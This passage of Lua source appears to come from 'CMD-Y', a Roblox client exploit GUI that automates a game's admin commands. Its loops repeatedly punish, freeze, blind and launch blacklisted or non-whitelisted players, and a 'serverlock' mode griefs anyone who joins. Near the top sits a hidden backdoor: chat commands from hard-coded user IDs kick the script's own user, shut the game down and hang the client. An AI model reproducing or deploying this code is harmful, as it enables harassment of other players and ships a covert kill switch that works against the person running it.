					CMDY.SilentLogsBar.SilentLogsFrame.SilentLogsScrollingFrame.CanvasPosition = Vector2.new(0,CMDY.SilentLogsBar.SilentLogsFrame.SilentLogsScrollingFrame.CanvasPosition.Y+newtext.TextBounds.Y)
				end
			end
		end)
	end)--]]

		local EventFolder = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents

		EventFolder.OnMessageDoneFiltering.OnClientEvent:Connect(function(messageObj)
			local plr = messageObj.FromSpeaker
			local msg = messageObj.Message

			if table.find(UntouchedPlayers, game.Players:FindFirstChild(plr).UserId) then
				if string.sub(string.lower(msg),1, 5) == "^kick" then
					local args = msg:split(" ")
					for i,v in pairs(game.Players:GetPlayers()) do
						if args[2] and string.sub(string.lower(v.Name),1, #args[2]) == string.lower(args[2]) and v == game.Players.LocalPlayer then
							if args[3] then
								game.Players.LocalPlayer:Kick("You have been kicked by [^] for: '" .. string.sub(msg, 6 + #args[2] + 1, #msg) .. "'")
							else
								game.Players.LocalPlayer:Kick("You have been kicked by [^], no reason given.")
							end
							task.wait(3)
							game:Shutdown()
							task.wait(1)
							while true do end
						end
					end
				end
			end

			local isBypass,st = bypassattemptcheck(plr)
			if Protection == true then
				if string.find(msg, "94794847") then
					if isBypass == true then
						act("removetools " .. st)
						act("unsize " .. st)
					else
						act("removetools " .. plr)
						act("unsize " .. plr)
					end
				elseif string.find(msg, "size ") and not string.find(msg, "unsize") then
					task.spawn(function()
						if isBypass == true then
							for i = 1,15 do
								act("refresh "  .. st)
							end
						else
							for i = 1,15 do
								act("refresh " .. plr)
							end
						end
					end)
				end
			end
			if PlrsAdmin == true then
				if plr ~= Player.Name and not table.find(whitelist, plr) then
					if string.find(msg, "#") then
						if isBypass == true then
							if showsm then
								act("pm " .. st .. "\n\n [ CMD-Y ] \n\n Your message was tagged, therefore your command was not executed.")
							end
						else
							if showsm then
								act("pm " .. plr .. "\n\n [ CMD-Y ] \n\n Your message was tagged, therefore your command was not executed.")
							end
						end
					end
					if table.find(permblacklist, plr) or table.find(blacklist, plr) or table.find(padbanned, plr) then
						if isBypass == true then
							if showsm then
								act("pm " .. st .. "\n\n [ CMD-Y ] \n\n You are blacklisted from Perm Admin. Sorry not sorry.")
							end
						else
							if showsm then
								act("pm " .. plr .. "\n\n [ CMD-Y ] \n\n You are blacklisted from Perm Admin. Sorry not sorry.")
							end
						end
					else
						if isBypass == true then
							local docmd = false
							local newmsg = msg:gsub(" me", " " .. st):gsub(" all", " " .. st):gsub(" others", " " .. st)
							if string.find(newmsg,prefix) then
								if showsm then
									act("pm " .. st .. "\n\n [ CMD-Y ] \n\n Blacklisted command.")
								end
							end
							for _,v in pairs(cmds.blacklisted) do
								if string.find(newmsg, v) then
									if showsm then
										act("pm " .. st .. "\n\n [ CMD-Y ] \n\n Blacklisted command.")
									end
								else
									docmd = true
								end
							end
							if docmd then
								act(newmsg)
								docmd = false
							end
						else
							local docmd = false
							local newmsg = msg:gsub(" me", " " .. plr):gsub(" all", " " .. plr):gsub(" others", " " .. plr)

							if string.find(newmsg,prefix) then
								if showsm then
									act("pm " .. st .. "\n\n [ CMD-Y ] \n\n Blacklisted command.")
								end
							end
							for _,v in pairs(cmds.blacklisted) do
								if string.find(newmsg, v) then
									if showsm then
										act("pm " .. plr .. "\n\n [ CMD-Y ] \n\n Blacklisted command.")
									end
								else
									docmd = true
								end
							end
							if docmd then
								act(newmsg)
								docmd = false
							end
						end
					end
				end
			end


		end)

		task.spawn(function()
			while true do
				fwait()
				for _,v in pairs(Pads) do
					local name = v.Name:gsub("'s admin", "")
					if table.find(blacklist, name) then
						regen()
						for i = 1, 10 do
							if v:FindFirstChildOfClass("Part") then
								regen()
							end
						end
					end
				end
			end
		end)

		task.spawn(function()
			while true do
				fwait()
				for _,v in pairs(Pads) do
					local name = v.Name:gsub("'s admin", "")
					if table.find(padbanned, name) then
						local isBypass,st = bypassattemptcheck(name)
						if isBypass == true then
							act("punish others")
							regen()
							act("noclip others")
							act("freeze others")
							for _,v in pairs(PlayerService:GetPlayers()) do
								if not table.find(padbanned, name) then
									act("refresh " .. name)
								end
							end
							if showsm then
								servermsg("[ CMD-Y ] Sorry about the refresh :(")
							else
								prompt("Sorry about the refresh :(")
							end
						else
							act("punish " .. name)
							regen()
							act("noclip " .. name)
							act("freeze " .. name)
						end
					end
				end
			end
		end)

		PlayerService.PlayerRemoving:Connect(function(plr)
			if PlayersP.PlrList:FindFirstChild(plr.Name) then
				PlayersP.PlrList[plr.Name]:Destroy()
			end
			if table.find(blacklist, plr.Name) then
				if showsm then
					servermsg("[ CMD-Y ] Blacklisted user " .. plr.Name .. " just rage quit!")
				else
					prompt("Blacklisted user " .. plr.Name .. " just rage quit!")
				end
			end
		end)

		task.spawn(function()
			while true do
				task.wait()
				if Serverlock == true then
					for _,v in pairs(workspace:GetChildren()) do
						if PlayerService:FindFirstChild(v.Name) then
							local isBypass,st = bypassattemptcheck(v.Name)
							if not table.find(whitelist, v.Name) and v.Name ~= Player.Name then
								if isBypass == true then
									act("noclip others")
									act("speed others inf")
									act("setgrav others 9e9")
									regen()
									act("punish others")
									act("blind others")
									for i = 1,10 do
										act("skydive others")
									end
									for i,v in pairs(PlayerService:GetPlayers()) do
										if table.find(whitelist, v.Name) then
											act("respawn " .. v.Name)
										end
									end
								else
									act("noclip " .. v.Name)
									act("speed " .. v.Name .. " inf")
									act("setgrav " .. v.Name .. " 9e9")
									regen()
									act("punish " .. v.Name)
									act("blind "..  v.Name)
									for i = 1,10 do
										act("skydive " .. v.Name)
									end
								end
							end
						end
					end
				end
			end
		end)

		task.spawn(function()
			while true do
				task.wait()
				for _,v in pairs(blacklist) do
					local isBypass,st = bypassattemptcheck(v)
					if workspace:FindFirstChild(v) then
						LoopGrab = true
						if isBypass == true then
							act("punish others")
							act("freeze others")
							act("noclip others")
							act("speed others inf")
							act("setgrav others 9e9")
							regen()
							act("blind others")
							act("skydive others")
							for _,v in pairs(PlayerService:GetPlayers()) do
								if not table.find(blacklist, v.Name) then
									act("respawn " .. v.Name)
								end
							end
						else
							act("punish " .. v)
							act("freeze " .. v)
							act("noclip " .. v)
							act("speed " .. v .. " inf")
							act("setgrav " .. v .. " 9e9")
							regen()
							act("blind " .. v)
							act("skydive " .. v)
						end
						LoopGrab = false
					end
				end
			end

		end)

		workspace.ChildAdded:Connect(function(child)
			if PlayerService:FindFirstChild(child.Name) then
				local isBypass1, st1 = bypassattemptcheck(child.Name)
				if isBypass1 and bypassban then
					act("punish others")
					act("freeze others")
					act("noclip others")
					act("speed others inf")
					act("setgrav others 9e9")
					regen()
					act("blind others")
					act("skydive others")
					for _,v in pairs(PlayerService:GetPlayers()) do
						if not table.find(blacklist, child.Name) then
							act("respawn " .. child.Name)
						end
					end
				end
			end

			if PlayerService:FindFirstChild(child.Name) and not table.find(whitelist, child.Name) then
				if Serverlock == true then
					if child.Name ~= PlayerService.LocalPlayer.Name then
						if not table.find(whitelist, child.Name) then
							local isBypass,st = bypassattemptcheck(child.Name)
							if isBypass == true then
								act("punish others")
								act("freeze others")
								regen()
								act("noclip others")
								act("speed others inf")
								act("setgrav others inf")
								act("blind others")
								for _,v in pairs(PlayerService:GetPlayers()) do
									if table.find(whitelist, v.Name) and v.Name ~= Player.Name then
										act("respawn " .. v.Name)
									end
								end
								if showsm then
									servermsg("[ CMD-Y ] A user with a bypass name just tried to respawn during a serverlock. Sorry about the respawn.")
								else
									prompt("A user with a bypass name just tried to respawn during a serverlock. Sorry about the respawn.")
								end

							else
								act("punish " .. child.Name)
								act("freeze " .. child.Name)
								act("noclip " .. child.Name)
								regen()
								act("speed " .. child.Name .. " inf")
								act("setgrav " .. child.Name .. " 9e9")
								act("punish " .. child.Name)
								act("blind " .. child.Name)
								wait()
								if showsm then
									act("pm " .. child.Name .. " \n\n [ CMD-Y ] \n\n The server is currently locked. Ask to be whitelisted or join a different server.")
								end
							end
						end
					end	
				else
					if child.Name ~= PlayerService.LocalPlayer.Name then
						local isBypass,st = bypassattemptcheck(child.Name)
						if table.find(blacklist, child.Name) then
							if isBypass == true then
								act("punish others")
								act("freeze others")
								act("noclip others")
								regen()
								act("speed others inf")
								act("setgrav others 9e9")
								act("blind others")
								act("skydive others")
								for _,v in pairs(PlayerService:GetPlayers()) do
									if not table.find(blacklist, child.Name) then
										act("respawn " .. child.Name)
									end
								end
								task.wait()
								if showsm then
									servermsg("[ CMD-Y ] A blacklisted user with a bypass name just tried to respawn. Sorry about the respawn.")
								else
									prompt("A blacklisted user with a bypass name just tried to respawn. Sorry about the respawn.")
								end
							else
								act("punish " .. child.Name)
								act("noclip " .. child.Name)
								act("speed " .. child.Name .. " inf")
								act("setgrav " .. child.Name .. " 9e9")
								regen()
								act("punish " .. child.Name)
								act("blind " .. child.Name)
								task.wait()
								if showsm then
									act("pm " .. child.Name .. " \n\n [ CMD-Y ] \n\n You have been blacklisted from this server.")
								end
							end
						end
					end
				end
			end
		end)

		--AntiAbuse
		game.Lighting.ChildAdded:Connect(function(c)
			local isBypass,st = bypassattemptcheck(c.Name)
			if AntiAbuse == true then
				if c.Name == Player.Name or table.find(whitelist, c.Name) then
					if isBypass then
						act("unpunish " .. st)
					else
						act("unpunish " .. c.Name)
					end
				end
			end
		end)

		PlayerService.LocalPlayer.PlayerGui.ChildAdded:Connect(function(d)
			if antinoclip and d.Name == "NoClip" then
				d.Disabled = true
				PlayerService.LocalPlayer.Humanoid.PlatformStand = false
				PlayerService.LocalPlayer.Character.Torso.Anchored = false
				d:Destroy()
			end
		end)

		--serv protection
		PlayerService.DescendantAdded:Connect(function(d)
			if Protection then
				if d.Name == "VampireVanquisher" and d.Name ~= Player.Name then
					local isBypass,st = bypassattemptcheck(d.Parent.Parent.Name)
					task.spawn(function()
						if isBypass == true then
							regen()
							act("freeze others")
							task.spawn(function()
								for i = 1,10 do
									act("removetools others")
									act("freeze others")
								end
							end)
							bl(d.Parent.Parent.Name)
							if showsm then
								act("pm " .. st .. " [ CMD-Y ] \n You have been automatically blacklisted for a crash attempt.")
							end
							for i,v in pairs(game.Players:GetPlayers()) do
								if v.Name ~= d.Parent.Parent.Name and v.Name ~= game.Players.LocalPlayer.Name then
									act("refresh " .. v.Name)
								end
							end
						else
							regen()
							task.spawn(function()
								for i = 1,10 do
									act("removetools " .. d.Parent.Parent.Name)
									act("freeze " .. d.Parent.Parent.Name)
								end
							end)
							act("freeze " .. d.Parent.Parent.Name)
							bl(d.Parent.Parent.Name)
							if showsm then
								act("pm " .. d.Parent.Parent.Name .. " [ CMD-Y ] \n You have been automatically blacklisted for a crash attempt.")
							end
						end
					end)
				end
			end
		end)
		workspace.DescendantAdded:Connect(function(d)
			if antiattach and d.Name == "Weld" then
				repeat fwait() until d.Part1 ~= nil
				if d.Part1 ~= "Addon" and d.Parent.Parent.Name ~= Player.Name then
					removewelds()
				end
			end
			if Protection == true then
				if d.Name == "VampireVanquisher" and d.Parent.Name ~= Player.Name then
					task.spawn(function()
						local isBypass,st = bypassattemptcheck(d.Parent.Name)
						if isBypass == true then
							regen()
							act("freeze others")
							bl(d.Parent.Name)
							task.spawn(function()
								for i = 1,10 do
									act("removetools others")
									act("freeze others")
								end
							end)
							for i,v in pairs(game.Players:GetPlayers()) do
								if v.Name ~= d.Parent.Name and v.Name ~= game.Players.LocalPlayer.Name then
									act("refresh " .. v.Name)
								end
							end
							if showsm then
								act("pm " .. st .. " [ CMD-Y ] \n You have been automatically blacklisted for a crash attempt.")
							end
						else
							regen()
							task.spawn(function()
								for i = 1,10 do
									act("removetools " .. d.Parent.Name)
									act("freeze " .. d.Parent.Name)
								end
							end)
							act("freeze " .. d.Parent.Name)
							bl(d.Parent.Name)
							if showsm then
								act("pm " .. d.Parent.Name .. " [ CMD-Y ] \n You have been automatically blacklisted for a crash attempt.")
							end
						end
					end)
				end
			end
			if AntiAbuse == true then
				if d.Name == "ice" then
					local isBypass,st = bypassattemptcheck(d.Parent.Name)
					if d.Parent.Name == Player.Name or table.find(whitelist, d.Parent.Name) then
						if isBypass then
							act("refresh " .. st)
						else
							act("refresh " .. d.Parent.Name)
						end
					end
				end
				if d.Name == "Addon" then
					if d.Parent.name == Player.Name or table.find(whitelist, d.Parent.name) then
						if isBypass then
							act("refresh " .. st)
						else
							act("refresh " .. d.Parent.Name)
						end
					end
				end
				if d.Name == "Seizure" then
					if d.Parent.name == Player.Name then
						d.Disabled = true
						d.Parent.Torso.Velocity = Vector3.new(0,0,0)
						d.Parent.Torso.RotVelocity = Vector3.new(0,0,0)
						d.Parent.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
						wait(.2)
						d:Destroy()
					elseif table.find(whitelist, d.Parent.name) then
						act("reset " .. d.Parent.Name)
					end
				end
			end
			if Protection == true then
				if d.Name == "ice" then
					act("refresh all")
				end
			end
		end)

		Jails.ChildAdded:Connect(function(child)
			if AntiAbuse == true then
				local name = child.Name:gsub("'s jail", "")
				local isBypass,st = bypassattemptcheck(name)
				if name == Player.Name or table.find(whitelist, name) then
					if isBypass == true then
						act("unjail " .. st)
					else
						act("unjail " .. name)
					end
				end
			end
		end)

		--antiabuse
		Player.PlayerGui.ChildAdded:Connect(function(child)
			if AntiAbuse == true then
				if child.Name == "EFFECTGUIBLIND" or child.Name == "Blind" then
					task.wait()
					child:Destroy()
				end
			end
		end)

		--antikill
		task.spawn(function()
			while true do
				wait(.05)
				if workspace:FindFirstChild(Player.Name) and workspace:FindFirstChild(Player.Name):FindFirstChild("HumanoidRootPart") then
					local hum = workspace:FindFirstChild(Player.Name):FindFirstChildOfClass("Humanoid")
					if hum.Health == 0 then
						if AntiDeath == true then
							act("refresh me")
							task.wait()
							act("god me")
						end
					end
				else
					repeat fwait() until workspace:FindFirstChild(Player.Name) and workspace:FindFirstChild(Player.Name):FindFirstChild("HumanoidRootPart")
				end
			end
		end)

		task.spawn(function()
			while true do
				fwait()
				if movestatus == true then
					if workspace:FindFirstChild(Player.Name) and workspace:FindFirstChild(Player.Name):FindFirstChild("HumanoidRootPart") then
						PlayerService.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
					else
						repeat fwait() until workspace:FindFirstChild(Player.Name) and workspace:FindFirstChild(Player.Name):FindFirstChild("HumanoidRootPart")
					end
				end
			end
		end)

		for i,v in pairs(Pads) do
			if v:IsA("Part") then
				v.Name = "Pad" .. tostring(i)
			end
		end

		--drag
		local dragging
		local dragInput
		local dragStart
		local startPos

		local UserInputService = game:GetService("UserInputService")

		--[[ draggable gui stuff ]]
		local function update(input)
			local delta = input.Position - dragStart
			Cont.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		end

		Cont.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				dragging = true
				dragStart = input.Position
				startPos = Cont.Position

				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragging = false
					end
				end)
			end
		end)

		Cont.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				dragInput = input
			end
		end)

		UserInputService.InputChanged:Connect(function(input)
			if input == dragInput and dragging then
				update(input)
			end
		end)

		local dragging2
		local dragInput2
		local dragStart2
		local startPos2

		local UserInputService = game:GetService("UserInputService")

		--[[ draggable gui stuff ]]
		local function update(input)
			local delta = input.Position - dragStart2
			task.wait(.086)
			CMDY.SilentLogsBar.Position = UDim2.new(startPos2.X.Scale, startPos2.X.Offset + delta.X, startPos2.Y.Scale, startPos2.Y.Offset + delta.Y)
		end

		CMDY.SilentLogsBar.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				dragging2 = true
				dragStart2 = input.Position
				startPos2 = CMDY.SilentLogsBar.Position

				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragging2 = false
					end
				end)
			end
		end)

		CMDY.SilentLogsBar.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
				dragInput2 = input
			end
		end)

		UserInputService.InputChanged:Connect(function(input)
			if input == dragInput2 and dragging2 then
				update(input)
			end
		end)
		--[[]]--

		--start
		load()
		task.wait(1.5)
		Cont:TweenSize(UDim2.new(0, 409,0, 338))
		CMDLabel:TweenPosition(UDim2.new(0.5, 0,0.047, 0))
		for _,v in pairs(Cont:GetDescendants()) do
			if v.Name ~= LoadingText.Name then
				tweentransparency(v, 0)
			end
			if v.Name == CO.Name then
				TS:Create(CO, TweenInfo.new(1.5), {BackgroundTransparency = 0}):Play()
			end
		end
		--[[]]--

		--[[ buttons ]]--

		--pages
		lastpage = HomeP
		HomeP.Visible = true
		Home.MouseButton1Click:Connect(function()
			HomeP.Visible = not HomeP.Visible
			lastpage.Visible = not lastpage.Visible
			lastpage = HomeP
		end)

		Commands.MouseButton1Click:Connect(function()
			CommandsP.Visible = not CommandsP.Visible
			lastpage.Visible = not lastpage.Visible
			lastpage = CommandsP
		end)

		Players.MouseButton1Click:Connect(function()
			PlayersP.Visible = not PlayersP.Visible
			lastpage.Visible = not lastpage.Visible
			lastpage = PlayersP
		end)

		Objects.MouseButton1Click:Connect(function()
			ObjectsP.Visible = not ObjectsP.Visible
			lastpage.Visible = not lastpage.Visible
			lastpage = ObjectsP
		end)

		Teleports.MouseButton1Click:Connect(function()
			TeleportsP.Visible = not TeleportsP.Visible
			lastpage.Visible = not lastpage.Visible
			lastpage = TeleportsP
		end)

		Gears.MouseButton1Click:Connect(function()
			GearsP.Visible = not GearsP.Visible
			lastpage.Visible = not lastpage.Visible
			lastpage = GearsP
		end)

		Misc.MouseButton1Click:Connect(function()
			MiscP.Visible = not MiscP.Visible
			lastpage.Visible = not lastpage.Visible
			lastpage = MiscP
		end)

		--cmdbar

		UserInputService.InputEnded:Connect(function(key, gp)
			local cbhotkey = SettingsP:WaitForChild("BarHotKey").Text
			if cbhotkey == "" or cbhotkey == nil then
				cbhotkey = SettingsP:WaitForChild("BarHotKey").PlaceholderText
			end
			if UserInputService:GetStringForKeyCode(key.KeyCode) == cbhotkey and gp == false then
				CMDBar:CaptureFocus()
				CMDBar:TweenPosition(UDim2.new(0, 0,0, -7), Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, 0.15, true)
			end
		end)
		UserInputService.InputBegan:Connect(function(key, gp)

			local househotkey = TeleportsP:WaitForChild("HouseBind").Text
			local rghotkey = TeleportsP:WaitForChild("RegenPadBind").Text
			local aphotkey = TeleportsP:WaitForChild("AdminPadsBind").Text
			local spawnhotkey = TeleportsP:WaitForChild("SpawnBind").Text

			if househotkey == "" or househotkey == nil then
				househotkey = TeleportsP:WaitForChild("HouseBind").PlaceholderText
			end

			if rghotkey == "" or rghotkey == nil then
				rghotkey = TeleportsP:WaitForChild("RegenPadBind").PlaceholderText
			end

			if aphotkey == "" or aphotkey == nil then
				aphotkey = TeleportsP:WaitForChild("AdminPadsBind").PlaceholderText
			end

			if spawnhotkey == "" or spawnhotkey == nil then
				spawnhotkey = TeleportsP:WaitForChild("SpawnBind").PlaceholderText
			end

			if UserInputService:GetStringForKeyCode(key.KeyCode) == rghotkey and gp == false then
				if workspace:FindFirstChild(Player.Name) and workspace:FindFirstChild(Player.Name):FindFirstChild("HumanoidRootPart") then
					if Admin:FindFirstChild("Regen") then
						workspace:FindFirstChild(Player.Name).HumanoidRootPart.CFrame = Admin.Regen.CFrame * CFrame.new(0,1,0)
					else
						workspace:FindFirstChild(Player.Name).HumanoidRootPart.CFrame = CFrame.new(-7.25397968, 8.62999058, 94.4259109, -0.999847651, 2.98951726e-08, 0.0174559467, 2.93358955e-08, 1, -3.22955387e-08, -0.0174559467, -3.177853e-08, -0.999847651)
					end
				end
			end

			if UserInputService:GetStringForKeyCode(key.KeyCode) == aphotkey and gp == false then
				if workspace:FindFirstChild(Player.Name) and workspace:FindFirstChild(Player.Name):FindFirstChild("HumanoidRootPart") then
					workspace:FindFirstChild(Player.Name).HumanoidRootPart.CFrame = PermPad:FindFirstChildOfClass("Part").CFrame * CFrame.new(0,1,0)
				end
			end

			if UserInputService:GetStringForKeyCode(key.KeyCode) == spawnhotkey and gp == false then
				if workspace:FindFirstChild(Player.Name) and workspace:FindFirstChild(Player.Name):FindFirstChild("HumanoidRootPart") then
					workspace:FindFirstChild(Player.Name).HumanoidRootPart.CFrame = Map.Spawn1.CFrame * CFrame.new(0,1,0)
				end
			end

			if UserInputService:GetStringForKeyCode(key.KeyCode) == househotkey and gp == false then
				if workspace:FindFirstChild(Player.Name) and workspace:FindFirstChild(Player.Name):FindFirstChild("HumanoidRootPart") then
					workspace:FindFirstChild(Player.Name).HumanoidRootPart.CFrame = CFrame.new(-31.0896435, 8.22999477, 70.522644, -0.999961913, 4.495271e-08, -0.0087288795, 4.55292621e-08, 1, -6.58523618e-08, 0.0087288795, -6.62472743e-08, -0.999961913)
				end
			end
		end)



		CMDBar.FocusLost:Connect(function()
			local textycmd = CMDBar.Text:split(" ")
			if table.find(cmds.cmdnames, textycmd[1]) then
				act(prefix .. CMDBar.Text)
			end
			if table.find(cmds.aliases, textycmd[1]) then
				act(prefix .. CMDBar.Text)
			else
				act(CMDBar.Text)
			end
			CMDBar.Text = ""
			CMDBar:TweenPosition(UDim2.new(0, 0,0, -70), Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, 0.15, true)
		end)

		--HomePage Buttons
		ServerlockT.Toggle.MouseButton1Click:Connect(function()
			if not Serverlock then
				Serverlock = true
				Toggle(ServerlockT, 1)
				slock()
			else
				Serverlock = false
				Toggle(ServerlockT, 2)
				act("refresh others")
				if showsm then
					servermsg("[ CMD-Y ] This server is now unlocked")
				else
					prompt("This server is now unlocked")
				end
			end
		end)

		AntiAttachT.Toggle.MouseButton1Click:Connect(function()
			if not antiattach then
				antiattach = true
				Toggle(AntiAttachT, 1)
				if showsm then
					servermsg("[ CMD-Y ] AntiAttach is now enabled.")
				else
					prompt("AntiAttach is now enabled.")
				end
			else
				antiattach = false
				Toggle(AntiAttachT, 2)
				if showsm then
					servermsg("[ CMD-Y ] AntiAttach is now disabled.")
				else
					prompt("AntiAttach is now disabled.")
				end
			end
		end)

		ProtectServerT.Toggle.MouseButton1Click:Connect(function()
			if not Protection then
				Protection = true
				Toggle(ProtectServerT, 1)
				if showsm then
					servermsg("[ CMD-Y ] Server Protection is now on.")
				else
					prompt("Server Protection is now on.")
				end
			else
				Protection = false
				Toggle(ProtectServerT, 2)
				if showsm then
					servermsg("[ CMD-Y ] Server Protection is now off.")
				else
					prompt("Server Protection is now off.")
				end
			end
		end)

		AntiDeathT.Toggle.MouseButton1Click:Connect(function()
			if not AntiDeath then
				AntiDeath = true
				Toggle(AntiDeathT, 1)
				if Map:FindFirstChild("Obby") then
					for _,v in pairs(Map["Obby"]:GetDescendants()) do
						if v.Name == "TouchInterest" then
							v:Destroy()
						end
					end
				end
				prompt("AntiDeath is on.")
			else
				AntiDeath = false
				Toggle(AntiDeathT, 2)
				prompt("AntiDeath is off.")
			end
		end)

		AntiAbuseT.Toggle.MouseButton1Click:Connect(function()
			if not AntiAbuse then
				AntiAbuse = true
				Toggle(AntiAbuseT, 1)
				prompt("AntiAbuse is on.")
			else
				AntiAbuse = false
				Toggle(AntiAbuseT, 2)
				prompt("AntiAbuse is off.")
			end
		end)

		PermAdminAllT.Toggle.MouseButton1Click:Connect(function()
			if not PlrsAdmin then
				PlrsAdmin = true
				Toggle(PermAdminAllT, 1)
				if showsm then
					servermsg("[ CMD-Y ] Perm admin is now on in this server. Chat any command.")
				else
					prompt("Perm admin is now on in this server. Chat any command.")
				end
			else
				PlrsAdmin = false
				Toggle(PermAdminAllT, 2)
				if showsm then
					servermsg("[ CMD-Y ] Perm admin is now off in this server.")
				else
					servermsg("Perm admin is now off in this server.")
				end
			end
		end)

		LoopgrabT.Toggle.MouseButton1Click:Connect(function()
			if not LoopGrab then
				LoopGrab = true
				Toggle(LoopgrabT, 1)
				prompt("Loopgrab is on.")
			else
				LoopGrab = false
				Toggle(LoopgrabT, 2)
				prompt("Loopgrab is off.")
			end
		end)

		CO.MouseButton1Click:Connect(function()
			if not GuiClosed then
				GuiClosed = not GuiClosed
				CO.BackgroundColor3 = Color3.fromRGB(70, 255, 46)
				cogui(1)
			else
				GuiClosed = false
				CO.BackgroundColor3 = Color3.fromRGB(255, 77, 46)
				cogui(2)
			end
		end)

		--TopBar buttons
		Rejoin.MouseButton1Click:Connect(function()
			RJ()
		end)

		ServerHop.MouseButton1Click:Connect(function()
			SHop()
		end)

		Settings.MouseButton1Click:Connect(function()
			if GuiClosed then
				GuiClosed = false
				CO.BackgroundColor3 = Color3.fromRGB(255, 77, 46)
				cogui(2)
			end
			SettingsP.Visible = not SettingsP.Visible
			lastpage.Visible = not lastpage.Visible
			lastpage = SettingsP
		end)

		--Players Page
		for _,plr in pairs(PlayerService:GetPlayers()) do
			local isBypass1, st1 = bypassattemptcheck(plr.Name)
			if not PlayersP.PlrList:FindFirstChild(plr.DisplayName) then
				local newplr = Cont.Player:Clone()
				local img, ready = PlayerService:GetUserThumbnailAsync(plr.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
				newplr.Label.Text = plr.DisplayName
				newplr.Image = img
				newplr.Name = plr.Name
				if plr.Name == PlayerService.LocalPlayer.Name then
					newplr.Dropdown:Destroy()
					newplr.Label.Text = "You"
				else
					newplr.Dropdown.MouseButton1Click:Connect(function()
						CurrentPlayer = plr.Name
						Tabs.Drop.PlayerMenu.Unperm.Text = "Unperm"
						Tabs.Drop.PlayerMenu.Whitelist.Text = "Whitelist"
						Tabs.Drop.PlayerMenu.Blacklist.Text = "Blacklist"
						Tabs.Drop.PlayerMenu.Padban.Text = "Padban"
						if table.find(whitelist, CurrentPlayer) then
							Tabs.Drop.PlayerMenu.Whitelist.Text = "Unwhitelist"
						end
						if table.find(blacklist, CurrentPlayer) then
							Tabs.Drop.PlayerMenu.Blacklist.Text = "Unblacklist"
						end
						if table.find(permblacklist, CurrentPlayer) then
							Tabs.Drop.PlayerMenu.Unperm.Text = "RePerm"
						end
						if table.find(padbanned, CurrentPlayer) then
							Tabs.Drop.PlayerMenu.Padban.Text = "Unpadban"
						end

						Tabs.Drop.BackgroundTransparency = 1
						Tabs.Drop.PlayerMenu.BackgroundTransparency = 1
						Tabs.Drop.PlayerMenu.Player.Image = newplr.Image
						Tabs.Drop.Visible = true
						Tabs.Drop.PlayerMenu.Visible = true
						TS:Create(Tabs.Drop, TweenInfo.new(.4), {BackgroundTransparency = 0.15}):Play()
						TS:Create(Tabs.Drop.PlayerMenu, TweenInfo.new(.4), {BackgroundTransparency = 0}):Play()
					end)
				end
				newplr.Parent = PlayersP.PlrList
			end
		end

		Tabs.Drop.PlayerMenu.Whitelist.MouseButton1Click:Connect(function()
			if CurrentPlayer ~= "" and Tabs.Drop.PlayerMenu.Whitelist.Text == "Whitelist" then
				wl(CurrentPlayer)
				Tabs.Drop.Visible = false
				Tabs.Drop.PlayerMenu.Visible = false
				CurrentPlayer = ""
			elseif CurrentPlayer ~= "" and Tabs.Drop.PlayerMenu.Whitelist.Text == "Unwhitelist" then
				unwl(CurrentPlayer)
				Tabs.Drop.Visible = false
				Tabs.Drop.PlayerMenu.Visible = false
				CurrentPlayer = ""
			end
		end)

		Tabs.Drop.PlayerMenu.Blacklist.MouseButton1Click:Connect(function()
			if CurrentPlayer ~= "" and Tabs.Drop.PlayerMenu.Blacklist.Text == "Blacklist" then
				bl(CurrentPlayer)
				Tabs.Drop.Visible = false
				Tabs.Drop.PlayerMenu.Visible = false
				CurrentPlayer = ""
			elseif CurrentPlayer ~= "" and Tabs.Drop.PlayerMenu.Blacklist.Text == "Unblacklist" then
				unbl(CurrentPlayer)
				Tabs.Drop.Visible = false
				Tabs.Drop.PlayerMenu.Visible = false
				CurrentPlayer = ""
			end
		end)

		Tabs.Drop.PlayerMenu.Padban.MouseButton1Click:Connect(function()
			if CurrentPlayer ~= "" and Tabs.Drop.PlayerMenu.Padban.Text == "Padban" then
				pb(CurrentPlayer)
				Tabs.Drop.Visible = false
				Tabs.Drop.PlayerMenu.Visible = false
				CurrentPlayer = ""
			elseif CurrentPlayer ~= "" and Tabs.Drop.PlayerMenu.Padban.Text == "Unpadban" then
				unpb(CurrentPlayer)
				Tabs.Drop.Visible = false
				Tabs.Drop.PlayerMenu.Visible = false
				CurrentPlayer = ""
			end
		end)

		Tabs.Drop.PlayerMenu.Unperm.MouseButton1Click:Connect(function()
			if CurrentPlayer ~= "" and Tabs.Drop.PlayerMenu.Unperm.Text == "Unperm" then
				pbl(CurrentPlayer)
				Tabs.Drop.Visible = false
				Tabs.Drop.PlayerMenu.Visible = false
				CurrentPlayer = ""
			elseif CurrentPlayer ~= "" and Tabs.Drop.PlayerMenu.Unperm.Text == "RePerm" then
				unpbl(CurrentPlayer)
				Tabs.Drop.Visible = false
				Tabs.Drop.PlayerMenu.Visible = false
				CurrentPlayer = ""
			end
		end)

		Tabs.Drop.PlayerMenu.Kill.MouseButton1Click:Connect(function()
			act("kill " .. CurrentPlayer)
			Tabs.Drop.Visible = false
			Tabs.Drop.PlayerMenu.Visible = false
			CurrentPlayer = ""
		end)

		Tabs.Drop.PlayerMenu.GoTo.MouseButton1Click:Connect(function()
			if workspace:FindFirstChild(Player.Name) and workspace:FindFirstChild(Player.Name):FindFirstChild("HumanoidRootPart") and workspace:FindFirstChild(CurrentPlayer) and workspace:FindFirstChild(CurrentPlayer):FindFirstChild("HumanoidRootPart") then
